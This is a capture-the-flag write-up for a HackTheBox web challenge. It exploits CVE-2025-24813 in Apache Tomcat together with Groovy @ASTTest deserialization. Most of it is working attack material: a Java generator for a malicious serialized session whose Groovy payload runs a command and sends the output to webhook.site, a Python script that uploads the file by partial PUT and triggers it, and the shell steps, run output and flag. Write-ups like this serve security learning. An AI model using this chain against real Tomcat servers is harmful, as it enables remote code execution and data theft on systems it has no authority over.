# ashenvault - HackTheBox Neurogrid CTF 2025

**Category:** Web
**Difficulty:** Medium
**Solved:** Yes

## Challenge Description
The Whisper Network carries messages across Kurozan's empire, recording every movement and decree in silence. It has no voice of its own, yet it remembers everything spoken through it.

## Initial Analysis

The challenge provides a web application running Apache Tomcat 9.0.98 with the following key components:

### Application Stack
- **Web Server:** Nginx (reverse proxy)
- **Application Server:** Apache Tomcat 9.0.98
- **Session Management:** PersistentManager with FileStore
- **Custom Library:** `demo-1.0-SNAPSHOT.jar` containing a vulnerable `Testing` class

### Key Findings

1. **Tomcat Configuration (`conf/web.xml`):**
   - DefaultServlet has `readonly=false` - allows PUT requests
   - Partial PUT enabled (`allowPartialPut=true`)

2. **Session Management (`conf/context.xml`):**
   ```xml
   <Manager className="org.apache.catalina.session.PersistentManager">
       <Store className="org.apache.catalina.session.FileStore" />
   </Manager>
   ```

3. **Vulnerable Code (`Testing.java`):**
   ```java
   private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
       ois.defaultReadObject();
       if (groovyScript != null && !groovyScript.trim().isEmpty()) {
           processGroovyScript();
       }
   }

   private void processGroovyScript() {
       groovyClassLoader = new GroovyClassLoader(Thread.currentThread().getContextClassLoader());
       Class<?> groovyClass = groovyClassLoader.parseClass(groovyScript);
       // Parses Groovy script without sandboxing
   }
   ```

## Vulnerability Chain

This challenge exploits **CVE-2025-24813** - Apache Tomcat Session Deserialization RCE, combined with Groovy's **@ASTTest** annotation for code execution during parsing.

### Exploitation Steps

1. **File Upload via Partial PUT (CVE-2025-24813)**
   - Tomcat's DefaultServlet with `readonly=false` accepts PUT requests
   - Content-Range header triggers partial PUT handling
   - Upload malicious serialized session file to writable location

2. **Groovy @ASTTest RCE**
   - The `Testing` class deserializes and calls `GroovyClassLoader.parseClass()`
   - `@groovy.transform.ASTTest` annotation executes code during AST transformation (compile-time)
   - This bypasses the fact that the code only parses the class without executing it

3. **Session Deserialization Trigger**
   - Access application with `JSESSIONID` cookie matching uploaded session file
   - Tomcat's FileStore deserializes the malicious session object
   - Groovy executes the @ASTTest payload during parseClass()

## Exploit Development

### Payload Generator (`GeneratePayload.java`)

The key challenge was exfiltrating the flag from the remote server. Initial attempts printed to stdout, which only appears in server logs. The solution uses **HTTP exfiltration via webhook.site**.

```java
import java.io.*;
import java.lang.reflect.Field;

public class GeneratePayload {
    public static void main(String[] args) throws Exception {
        Object testing = Class.forName("com.example.Testing")
            .getConstructor(String.class, int.class)
            .newInstance("test", 100);

        Field groovyScriptField = testing.getClass().getDeclaredField("groovyScript");
        groovyScriptField.setAccessible(true);

        // Groovy @ASTTest annotation executes during parseClass()
        // Exfiltrates flag via HTTP GET to webhook.site
        String maliciousGroovy =
            "@groovy.transform.ASTTest(value={\n" +
            "  Process p = Runtime.getRuntime().exec(\"/readflag\");\n" +
            "  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n" +
            "  StringBuilder flag = new StringBuilder();\n" +
            "  String line;\n" +
            "  while ((line = br.readLine()) != null) {\n" +
            "    flag.append(line).append('\\\\n');\n" +
            "  }\n" +
            "  p.waitFor();\n" +
            "  String encodedFlag = java.net.URLEncoder.encode(flag.toString(), 'UTF-8');\n" +
            "  String webhookUrl = 'https://webhook.site/<UUID>?flag=' + encodedFlag;\n" +
            "  java.net.URL url = new java.net.URL(webhookUrl);\n" +
            "  java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();\n" +
            "  conn.setRequestMethod('GET');\n" +
            "  conn.getResponseCode();\n" +
            "  conn.disconnect();\n" +
            "})\n" +
            "def x";

        groovyScriptField.set(testing, maliciousGroovy);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(testing);
        oos.close();

        FileOutputStream fos = new FileOutputStream("payload.ser");
        fos.write(baos.toByteArray());
        fos.close();

        System.out.println("Payload generated: payload.ser");
    }
}
```

### Exploit Script (`exploit.py`)
```python
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin

def exploit(target_url):
    with open('payload.ser', 'rb') as f:
        payload = f.read()

    session_id = "rce456"

    # Step 1: Upload malicious session file using partial PUT
    headers = {
        'Content-Range': f'bytes 0-{len(payload)-1}/{len(payload)}',
        'Content-Type': 'application/octet-stream'
    }

    upload_url = urljoin(target_url, f"/{session_id}.session")
    response = requests.put(upload_url, data=payload, headers=headers, allow_redirects=False)

    print(f"[*] Upload response: {response.status_code}")

    # Step 2: Trigger deserialization with JSESSIONID cookie
    cookies = {'JSESSIONID': f"{session_id}.session"}
    trigger_url = urljoin(target_url, "/")

    response = requests.get(trigger_url, cookies=cookies, allow_redirects=False)
    print(f"[*] Trigger response: {response.status_code}")
    print("[+] Exploit executed! Check server logs for flag output.")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8081"
    exploit(target)
```

## Exploitation

```bash
# Step 1: Create webhook URL for flag exfiltration
# Visit https://webhook.site or use automation
WEBHOOK_UUID="<your-uuid>"

# Step 2: Update GeneratePayload.java with webhook URL
# Replace <UUID> in the maliciousGroovy string with your webhook UUID

# Step 3: Compile payload generator
javac -cp "demo-1.0-SNAPSHOT.jar:." GeneratePayload.java

# Step 4: Generate malicious payload
java -cp "demo-1.0-SNAPSHOT.jar:." GeneratePayload

# Step 5: Run exploit against target
python3 exploit.py http://154.57.164.79:31386

# Step 6: Check webhook.site for captured flag
# The flag will appear in the query parameter: ?flag=...
```

### Successful Exploitation Results
```bash
[*] CVE-2025-24813 Exploit
[*] Upload response: 204
[+] Payload uploaded successfully!
[*] Trigger response: 200

# From webhook.site:
Method: GET
URL: https://webhook.site/<UUID>?flag=Contents+of+%2Froot%2Fflag.txt%3A...
Query: {'flag': 'Contents of /root/flag.txt:\n==========================\nHTB{CVE-2025-24813_plus_gr0vy_met4_pr0gramming_is_the_best_021966025225902b828cb944cf914859}\n'}
```

## Flag
**HTB{CVE-2025-24813_plus_gr0vy_met4_pr0gramming_is_the_best_021966025225902b828cb944cf914859}**

**Points:** 1000

The exploit successfully achieved remote code execution by:
1. Uploading a malicious serialized Java object via CVE-2025-24813 (partial PUT)
2. Leveraging Groovy's @ASTTest annotation for compile-time code execution
3. Triggering deserialization through Tomcat's FileStore session management
4. Executing `/readflag` and exfiltrating output via HTTP to webhook.site

## Key Takeaways

- **CVE-2025-24813** affects Tomcat 9.0.0-9.0.98 when `readonly=false` and FileStore is enabled
- **Groovy @ASTTest** is a powerful vector for RCE during `parseClass()` operations
- Session persistence mechanisms can be exploited for deserialization attacks
- **HTTP exfiltration** is essential for blind RCE scenarios where you can't access server logs
- Defense-in-depth: disable unnecessary features (PUT, session persistence) and sandbox untrusted code execution
